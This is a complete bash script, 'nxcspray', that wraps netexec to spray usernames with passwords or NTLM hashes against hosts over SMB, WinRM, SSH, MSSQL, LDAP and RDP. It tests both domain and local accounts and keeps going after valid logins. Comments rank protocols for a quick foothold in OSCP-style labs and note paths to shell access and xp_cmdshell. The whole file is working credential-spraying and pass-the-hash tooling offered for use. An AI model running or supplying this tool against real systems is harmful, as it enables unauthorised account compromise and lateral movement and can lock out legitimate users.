#!/bin/bash

# Usage:
#   nxcspray <protocols|all> <targets> -u <username> -p <password>
#
# Examples:
#   nxcspray all 10.10.10.10 -u amxn -p password
#   nxcspray smb,ldap,winrm hosts.txt -u amxn -p password
#   nxcspray all "10.10.10.10 10.10.10.11" -u amxn -p password
#
# Tests EVERY protocol against BOTH domain accounts and local (SAM) accounts,
# and keeps going after a hit instead of stopping at the first valid login.

# ---- Usage ----
usage() {
    cat <<EOF
Usage: $0 <protocols|all> <targets> -u <username> -p <password>
       $0 <protocols|all> <targets> -u <username> -H <nthash>

    <protocols|all>   Comma-separated list of protocols, or "all"
                       Supported: smb,winrm,ssh,mssql,ldap,rdp

    <targets>          Single IP, space-separated IPs (quoted), or a file (one IP per line)

    -u <username>      Username, or a file of usernames
    -p <password>      Password, or a file of passwords
    -H <nthash>        NTLM hash, or a file of hashes (use instead of -p)

Examples:
    $0 all 10.10.10.10 -u amxn -p password
    $0 smb,ldap,winrm hosts.txt -u amxn -p password
    $0 all "10.10.10.10 10.10.10.11" -u amxn -p password
    $0 all targets.txt -u users.txt -p passwords.txt
    $0 all targets.txt -u users.txt -H hashes.txt
    $0 smb,winrm 10.10.10.10 -u amxn -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

Notes:
    - Every protocol is sprayed against BOTH domain accounts and local (SAM) accounts.
    - --continue-on-success is always used, so it won't stop at the first valid login.
    - Use either -p or -H, not both. ssh/ldap generally don't support pass-the-hash.
EOF
}

# ---- Argument Validation ----
if [ "$#" -lt 4 ]; then
    usage
    exit 1
fi

PROTOS_RAW="$1"
TARGETS_RAW="$2"
shift 2

USER=""
PASS=""
HASH=""

while getopts "u:p:H:" opt; do
    case $opt in
        u) USER="$OPTARG" ;;
        p) PASS="$OPTARG" ;;
        H) HASH="$OPTARG" ;;
        *)
            echo "[-] Invalid flag"
            usage
            exit 1
            ;;
    esac
done

if [ -z "$USER" ]; then
    echo "[-] Missing required flag: -u <username>"
    usage
    exit 1
fi

if [ -z "$PASS" ] && [ -z "$HASH" ]; then
    echo "[-] Provide either -p <password> or -H <nthash>"
    usage
    exit 1
fi

if [ -n "$PASS" ] && [ -n "$HASH" ]; then
    echo "[-] Use either -p or -H, not both"
    usage
    exit 1
fi

# Build the credential flag once: -p <pass> or -H <hash>
if [ -n "$HASH" ]; then
    CRED_FLAG="-H"
    CRED_VALUE="$HASH"
else
    CRED_FLAG="-p"
    CRED_VALUE="$PASS"
fi

# ---- Protocol Handling ----
# Ordered roughly by likelihood of a quick win / useful signal in OSCP-style labs:
#   smb    -> fastest, most commonly open, null/guest sessions, share access
#   winrm  -> direct shell access if creds are valid (Pwn3d!)
#   ssh    -> direct shell access on *nix boxes
#   mssql  -> can lead to xp_cmdshell / command exec
#   ldap   -> validates domain creds, useful recon even without a shell
#   rdp    -> slow, GUI-only, higher lockout risk, test last
if [ "$PROTOS_RAW" = "all" ]; then
    PROTO_ARRAY=(smb winrm ssh mssql ldap rdp)
else
    IFS=',' read -ra PROTO_ARRAY <<< "$PROTOS_RAW"
fi

# ---- Target Handling ----
# Supports: a single IP, space-separated IPs (quoted), or a file of IPs (one per line)
if [ -f "$TARGETS_RAW" ]; then
    TARGETS=$(cat "$TARGETS_RAW")
else
    TARGETS="$TARGETS_RAW"
fi

# ---- Colors ----
# Chosen to avoid netexec's own palette (green=success, red=fail, orange=Pwn3d!, blue=protocol)
MAGENTA='\033[1;35m'  # domain
CYAN='\033[1;36m'     # local
RESET='\033[0m'

# ---- Auth Mode Handling ----
# "" tests domain accounts, "--local-auth" tests local SAM accounts.
# --local-auth is only accepted by protocols that actually have a local
# account store (SMB/WinRM/MSSQL/RDP). ssh and ldap will reject it outright.
AUTH_MODES=("" "--local-auth")
AUTH_LABELS=("domain" "local")
AUTH_COLORS=("$MAGENTA" "$CYAN")

LOCAL_AUTH_SUPPORTED=(smb winrm mssql rdp)

supports_local_auth() {
    local proto="$1"
    for p in "${LOCAL_AUTH_SUPPORTED[@]}"; do
        [ "$p" = "$proto" ] && return 0
    done
    return 1
}

# ---- Spray Loop ----
for PROTO in "${PROTO_ARRAY[@]}"; do
    for i in "${!AUTH_MODES[@]}"; do
        MODE="${AUTH_MODES[$i]}"
        LABEL="${AUTH_LABELS[$i]}"
        COLOR="${AUTH_COLORS[$i]}"

        # Skip the local-auth pass for protocols that don't support it
        if [ "$LABEL" = "local" ] && ! supports_local_auth "$PROTO"; then
            echo -e "${COLOR}[~] Skipping $PROTO (auth: local) - not supported by this protocol${RESET}"
            continue
        fi

        echo -e "${COLOR}[+] Spraying protocol: $PROTO  (auth: ${LABEL})${RESET}"

        for TARGET in $TARGETS; do
            echo "    -> Target: $TARGET"
            nxc "$PROTO" "$TARGET" -u "$USER" "$CRED_FLAG" "$CRED_VALUE" --continue-on-success $MODE
        done
    done
done
